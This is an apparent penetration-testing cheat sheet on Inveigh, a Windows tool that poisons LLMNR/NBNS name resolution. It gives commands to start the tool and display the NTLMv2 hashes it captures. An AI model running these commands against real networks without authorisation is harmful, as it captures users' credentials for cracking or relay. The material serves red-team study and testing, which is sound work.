# Inveigh (Listen for NTLMv2/LLMNR)

OS: Active_Directory, Windows
Description: Inveigh works like responder. Listen for NTLMv2/LLMNR
Security Domains: Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21), Credential Access (https://www.notion.so/Credential-Access-1444c8e523768003b6fde866419041dc?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

### Inveigh (Responder on Windows)

- The Get-Command trick here is a good one.

```jsx
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
```

- Start it up with defaults

```jsx
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

### C# Version Inveigh (.exe)

```jsx
 .\Inveigh.exe
 (Hit ESC to enter the terminal)
 HELP
```

- Show Hashes at the terminal with

```jsx
GET NTLMV2UNIQUE
```